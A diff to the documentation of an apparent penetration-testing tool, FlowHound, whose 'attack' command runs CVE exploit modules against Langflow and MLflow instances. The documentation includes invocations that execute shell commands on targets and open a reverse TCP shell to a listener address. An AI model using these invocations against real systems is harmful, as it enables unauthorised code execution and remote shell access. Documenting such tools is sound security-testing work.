@@ -14,7 +14,7 @@ The `attack` command launches exploit modules against a target instance.
 1. Detects the running application and version (or uses `--application` to skip auto-detection).
 2. Queries the vulnerability database for CVEs that match the application, version, and authentication state.
 3. Prioritises unauthenticated exploits.
-4. Runs each matching exploit with a 20-second timeout.
+4. Runs each matching exploit with a 20-second timeout (up to 60-second execution wrapper timeout).
 5. Stops at the first successful exploit unless `--autopwn` is set.
 
 ---
@@ -39,7 +39,7 @@ flowhound attack --url <URL> [OPTIONS]
 | `--command` | No | Shell command to run on the target via the `execute_bash_command` payload |
 | `--reverse_shell` | No | `LHOST:LPORT` for a reverse TCP shell (e.g. `192.168.1.10:4444`) |
 | `--application` | No | Target application name (e.g. `langflow`, `mlflow`). Skips auto-detection when provided |
-| `--cve` | No | Limit exploitation to a single CVE (e.g. `CVE-2023-1177`) |
+| `--cve` | No | Limit exploitation to a single CVE (e.g. `CVE-2026-9198`) |
 | `-h`, `--help` | No | Show help text and exit |
 
 ---
@@ -106,16 +106,16 @@ flowhound attack --url http://TARGET:7860 --reverse_shell 192.168.1.10:4444
 Use `--cve` to limit execution to a single named CVE regardless of version detection results:
 
 ```bash
-flowhound attack --url http://TARGET:5000 --cve CVE-2023-1177
+flowhound attack --url http://TARGET:7860 --cve CVE-2026-9198
 ```
 
-The CVE ID is validated at startup (must match `CVE-YYYY-NNNNN[NNN]`). If the CVE is not found in the database FlowHound exits with no exploits run.
+The CVE ID is validated at startup (must match `CVE-YYYY-NNNNN[NNN]`). If the CVE is not found in the database or is not an exploit module, FlowHound exits with an error.
 
 ---
 
 ## Exploit execution
 
-Each exploit runs inside a `ThreadPoolExecutor` with a hard timeout of **20 seconds**. If an exploit does not return within that window it is skipped with a warning and FlowHound moves on to the next CVE.
+Each exploit runs inside a `ThreadPoolExecutor` with a timeout of **20 seconds** (`ExploitBaseClass.TIMEOUT`). If an exploit does not return within that window it is skipped with a warning and FlowHound moves on to the next CVE.
 
 The attack loop behaviour depends on `--autopwn`:
 
@@ -144,10 +144,10 @@ flowhound attack --url http://TARGET:7860 --proxy http://127.0.0.1:8080
 flowhound attack --url http://target.example.com:7860
 ```
 
-**Authenticated MLflow attack:**
+**Authenticated Langflow attack:**
 
 ```bash
-flowhound attack --url http://target.example.com:5000 --application mlflow --username admin --password secret
+flowhound attack --url http://target.example.com:7860 --application langflow --username admin --password secret
 ```
 
 **Run all exploits with a custom command:**
@@ -171,7 +171,7 @@ flowhound attack --url http://target.example.com:7860 --proxy http://127.0.0.1:8
 **Target a single CVE:**
 
 ```bash
-flowhound attack --url http://target.example.com:5000 --cve CVE-2023-1177
+flowhound attack --url http://target.example.com:7860 --cve CVE-2026-9198
 ```
 
 ---
@@ -183,12 +183,13 @@ flowhound attack --url http://target.example.com:5000 --cve CVE-2023-1177
 | `Error detecting target` | Target unreachable, or not a supported application | Verify the URL and that the instance is running; use `--application` to skip auto-detection |
 | `--command and --reverse_shell are mutually exclusive` | Both payload flags supplied | Supply only one |
 | `--username and --password must be provided together` | Only one credential flag supplied | Supply both or neither |
-| Exploit timeout warning | Exploit did not complete within 20 s | Target may be slow or the exploit path is blocked |
+| Exploit timeout warning | Exploit did not complete within timeout | Target may be slow or the exploit path is blocked |
 
 ---
 
 ## See also
 
+- [Scan](scan.md) — auxiliary module scanning.
 - [Sniff](sniff.md) — version detection without exploit execution.
 - [Vulnerability Database](vulnerabilities.md) — full CVE list.
 - [Architecture](architecture.md) — how exploit modules are discovered and loaded.
